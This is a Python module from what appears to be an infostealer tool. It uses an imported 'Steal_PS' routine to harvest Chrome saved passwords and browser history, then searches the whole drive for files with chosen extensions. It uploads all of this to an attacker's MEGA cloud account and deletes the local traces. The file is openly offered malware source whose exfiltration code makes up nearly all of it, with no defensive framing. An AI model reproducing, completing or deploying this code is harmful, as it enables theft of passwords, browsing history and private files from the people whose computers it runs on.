# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed > (De3vil)
# Don't touch my code, it's art 
#===============================
from mega import Mega
from os import chdir , remove  , getcwd , environ , walk , path
from Steal_PS import Main
from modules_virsion2.Moud.History import DumpHistory

class upToMaGePAS:
	def __init__(self):
		self.pa = getcwd()
		self.Mega_up = Mega()
	def up(self , email , password):
		mido = Main()
		mido.main()
		path = chdir(self.pa)
		remove("ChromeData.db")
		paTh = chdir(environ["temp"])
		self.Mega_up.login(email=email , password=password)
		self.Mega_up.upload("pass.txt")
		remove("pass.txt")

class upToMaGeHIS:
	def __init__(self):
		self.Mega_up = Mega()
	def up(self , email , password):
		self.Mega_up.login(email=email , password=password)
		print("login")
		mido = DumpHistory()
		mido.Mido()
		paTh = chdir(environ["temp"])
		self.Mega_up.upload("dump_history.txt")
		remove("dump_history.txt")



class FilesSend:
	def __init__(self):
		self.Mega_up = Mega()
	def Extension(self,extension):
		self.extensionn = extension
		self.ss = self.extensionn.split(",")
	def uploading(self,email , password ):
		self.Mega_up.login(email=email , password=password)
		for x , y , z in walk("\\"):
			for name in z:
				self.path =  path.join(x,name)
				self.mido = self.path.split('.')[-1]
				if self.mido in self.ss:
					pass
					file = self.Mega_up.upload(self.path)
